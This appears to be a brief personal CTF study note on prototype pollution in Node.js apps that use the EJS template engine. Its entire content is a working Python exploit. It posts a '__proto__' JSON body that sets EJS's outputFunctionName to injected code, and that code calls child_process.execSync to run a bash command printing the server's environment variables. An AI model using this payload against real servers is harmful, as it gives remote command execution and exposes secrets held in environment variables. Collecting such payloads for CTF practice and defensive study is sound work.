tags:: CTF/JS/原型链污染, CTF/NodeJS/EJS, CTF/NodeJS

- # OutputFunctionName
	- ```python
	  r = base_post(url, headers = headers, json = {
	      "__proto__": {
	          "outputFunctionName": "a=1;return global.process.mainModule.constructor._load('child_process').execSync('bash -c \"sleep 3; env\"');//"
	      }
	  })
	  print(r.text)
	  ```